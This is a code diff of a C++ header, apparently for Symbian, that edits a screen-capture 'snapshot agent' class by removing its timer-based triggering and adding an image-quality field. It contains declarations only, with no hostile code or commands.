@@ -16,15 +16,13 @@
 #include "AbstractAgent.h"
 #include "AdditionalDataStructs.h"
 
-#include <HT\TimeOutTimer.h>
-
 // CLASS DECLARATION
 
 /**
  *  CAgentSnapshot
  * 
  */
-class CAgentSnapshot : public CAbstractAgent, public MTimeOutNotifier
+class CAgentSnapshot : public CAbstractAgent
 	{
 public:
 	// Constructors and destructor
@@ -50,8 +48,6 @@ protected:
 	virtual void StopAgentCmdL();
 		
 private:
-	// From MTimeOutNotifier
-    virtual void TimerExpiredL(TAny* src);
 
     // Capture the image into mbm format
     void DoCaptureL();
@@ -71,13 +67,11 @@ private:
 	void ConstructL(const TDesC8& params);
 
 private:
-	CTimeOutTimer* iTimer;
-	TTimeIntervalSeconds iSecondsInterv;
 	RWsSession	iWsSession;
 	CWsScreenDevice* iScreenDevice;
 	CFbsBitmap*          iBitmap;
 	TBool   iCapturedScreen;
-	
+	TInt    iQuality;
 	};
 
 
